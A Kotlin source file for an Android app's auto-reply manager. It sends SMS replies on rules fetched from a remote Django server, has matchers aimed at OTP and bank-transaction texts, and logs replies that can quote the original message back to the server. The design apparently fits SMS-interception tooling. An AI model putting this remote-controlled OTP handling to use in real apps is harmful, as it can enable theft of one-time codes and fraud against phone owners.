package com.example.fast.util

import android.content.Context
import android.provider.Settings
import com.example.fast.config.AppConfig
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.prexoft.prexocore.anon.SimSlot
import com.prexoft.prexocore.sendSms
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Auto-Reply Manager
 * Handles automatic replies to incoming messages based on configurable rules
 */
object AutoReplyManager {
    
    private var autoReplyConfig: AutoReplyConfig? = null
    private val rateLimiter = mutableMapOf<String, Long>() // sender -> last reply time
    private const val RATE_LIMIT_MS = 60 * 1000L // 1 minute between replies to same sender
    
    private val managerScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    data class AutoReplyConfig(
        val enabled: Boolean,
        val trigger: String,
        val replyMessage: String,
        val conditions: Map<String, String>,
        val rateLimitEnabled: Boolean = true
    )
    
    /**
     * Setup auto-reply configuration
     */
    fun setupAutoReply(
        context: Context,
        enabled: Boolean,
        trigger: String,
        replyMessage: String,
        conditions: Map<String, String>
    ) {
        val config = AutoReplyConfig(
            enabled = enabled,
            trigger = trigger,
            replyMessage = replyMessage,
            conditions = conditions
        )
        
        autoReplyConfig = config
        
        // Save to Django (Device metadata)
        val deviceId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        
        managerScope.launch {
            try {
                val metadataUpdate = mapOf(
                    "auto_reply" to mapOf(
                        "enabled" to enabled,
                        "trigger" to trigger,
                        "replyMessage" to replyMessage,
                        "conditions" to conditions,
                        "updatedAt" to System.currentTimeMillis()
                    )
                )
                
                DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to metadataUpdate))
                LogHelper.d("AutoReplyManager", "Auto-reply configuration saved to Django")
            } catch (e: Exception) {
                LogHelper.e("AutoReplyManager", "Failed to save auto-reply configuration to Django", e)
            }
        }
    }
    
    /**
     * Process incoming message and send auto-reply if conditions match
     */
    fun processIncomingMessage(
        context: Context,
        sender: String,
        message: String,
        timestamp: Long
    ) {
        val config = autoReplyConfig ?: return
        
        if (!config.enabled) {
            return
        }
        
        // Check rate limiting
        if (config.rateLimitEnabled) {
            val lastReplyTime = rateLimiter[sender] ?: 0L
            if (System.currentTimeMillis() - lastReplyTime < RATE_LIMIT_MS) {
                LogHelper.d("AutoReplyManager", "Rate limit: Skipping auto-reply to $sender")
                return
            }
        }
        
        // Check if conditions match
        if (!matchesConditions(config, sender, message, timestamp)) {
            return
        }
        
        // Process reply message (handle templates/variables)
        val processedReply = processReplyMessage(config.replyMessage, sender, message)
        
        // Send auto-reply
        sendAutoReply(context, sender, processedReply)
        
        // Update rate limiter
        rateLimiter[sender] = System.currentTimeMillis()
        
        // Log auto-reply
        logAutoReply(context, sender, processedReply, timestamp)
    }
    
    /**
     * Check if message matches auto-reply conditions
     */
    private fun matchesConditions(
        config: AutoReplyConfig,
        sender: String,
        message: String,
        timestamp: Long
    ): Boolean {
        return when (config.trigger.lowercase()) {
            "all" -> true
            
            "keyword" -> {
                val keyword = config.conditions["keyword"] ?: return false
                message.contains(keyword, ignoreCase = true)
            }
            
            "sender" -> {
                val targetSender = config.conditions["sender"] ?: return false
                sender == targetSender
            }
            
            "time" -> {
                val startTime = config.conditions["startTime"] ?: return false
                val endTime = config.conditions["endTime"] ?: return false
                isWithinTimeRange(startTime, endTime)
            }
            
            "template" -> {
                val templateId = config.conditions["templateId"] ?: return false
                // Check if message matches template pattern
                matchesTemplate(templateId, message)
            }
            
            else -> false
        }
    }
    
    /**
     * Check if current time is within specified range
     */
    private fun isWithinTimeRange(startTime: String, endTime: String): Boolean {
        try {
            val calendar = java.util.Calendar.getInstance()
            val currentHour = calendar.get(java.util.Calendar.HOUR_OF_DAY)
            val currentMinute = calendar.get(java.util.Calendar.MINUTE)
            val currentTimeMinutes = currentHour * 60 + currentMinute
            
            val startParts = startTime.split(":")
            val endParts = endTime.split(":")
            
            if (startParts.size != 2 || endParts.size != 2) {
                return false
            }
            
            val startMinutes = startParts[0].toIntOrNull()?.let { it * 60 }?.plus(startParts[1].toIntOrNull() ?: 0) ?: return false
            val endMinutes = endParts[0].toIntOrNull()?.let { it * 60 }?.plus(endParts[1].toIntOrNull() ?: 0) ?: return false
            
            return if (startMinutes <= endMinutes) {
                currentTimeMinutes >= startMinutes && currentTimeMinutes <= endMinutes
            } else {
                // Crosses midnight
                currentTimeMinutes >= startMinutes || currentTimeMinutes <= endMinutes
            }
        } catch (e: Exception) {
            LogHelper.e("AutoReplyManager", "Error checking time range", e)
            return false
        }
    }
    
    /**
     * Check if message matches template pattern
     */
    private fun matchesTemplate(templateId: String, message: String): Boolean {
        // Simple pattern matching - can be enhanced
        return when (templateId.lowercase()) {
            "otp" -> message.matches(Regex(".*\\d{4,8}.*")) // Contains 4-8 digits
            "transaction" -> message.contains("Rs.", ignoreCase = true) || 
                           message.contains("INR", ignoreCase = true) ||
                           message.contains("₹", ignoreCase = true)
            else -> false
        }
    }
    
    /**
     * Process reply message with variables
     */
    private fun processReplyMessage(replyMessage: String, sender: String, originalMessage: String): String {
        var processed = replyMessage
        processed = processed.replace("{sender}", sender)
        processed = processed.replace("{message}", originalMessage)
        processed = processed.replace("{time}", 
            java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault())
                .format(java.util.Date()))
        processed = processed.replace("{date}", 
            java.text.SimpleDateFormat("dd-MM-yyyy", java.util.Locale.getDefault())
                .format(java.util.Date()))
        processed = processed.replace("{datetime}", 
            java.text.SimpleDateFormat("dd-MM-yyyy HH:mm", java.util.Locale.getDefault())
                .format(java.util.Date()))
        return processed
    }
    
    /**
     * Send auto-reply SMS
     */
    private fun sendAutoReply(context: Context, sender: String, message: String) {
        try {
            // Get default SIM (can be enhanced to use specific SIM)
            context.sendSms(sender, message, SimSlot.SIM_1)
            
            LogHelper.d("AutoReplyManager", "Auto-reply sent to $sender: $message")
        } catch (e: Exception) {
            LogHelper.e("AutoReplyManager", "Error sending auto-reply", e)
        }
    }
    
    /**
     * Log auto-reply action
     */
    private fun logAutoReply(context: Context, sender: String, message: String, originalTimestamp: Long) {
        val deviceId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        
        managerScope.launch {
            try {
                DjangoApiHelper.logAutoReply(
                    deviceId = deviceId,
                    sender = sender,
                    replyMessage = message,
                    originalTimestamp = originalTimestamp,
                    repliedAt = System.currentTimeMillis()
                )
                LogHelper.d("AutoReplyManager", "Auto-reply logged to Django")
            } catch (e: Exception) {
                LogHelper.e("AutoReplyManager", "Failed to log auto-reply to Django", e)
            }
        }
    }
    
    /**
     * Load auto-reply config from Django
     */
    fun loadAutoReplyConfig(context: Context) {
        val deviceId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        
        managerScope.launch {
            try {
                val deviceData = DjangoApiHelper.getDevice(deviceId)
                val syncMetadata = deviceData?.get("sync_metadata") as? Map<*, *>
                val autoReplyData = syncMetadata?.get("auto_reply") as? Map<*, *>
                
                if (autoReplyData != null) {
                    val enabled = autoReplyData["enabled"] as? Boolean ?: false
                    val trigger = autoReplyData["trigger"] as? String ?: "all"
                    val replyMessage = autoReplyData["replyMessage"] as? String ?: ""
                    val conditions = autoReplyData["conditions"] as? Map<String, String> ?: emptyMap()
                    
                    autoReplyConfig = AutoReplyConfig(
                        enabled = enabled,
                        trigger = trigger,
                        replyMessage = replyMessage,
                        conditions = conditions
                    )
                    
                    LogHelper.d("AutoReplyManager", "Auto-reply config loaded from Django: enabled=$enabled, trigger=$trigger")
                }
            } catch (e: Exception) {
                LogHelper.e("AutoReplyManager", "Error loading auto-reply config from Django", e)
            }
        }
    }
}
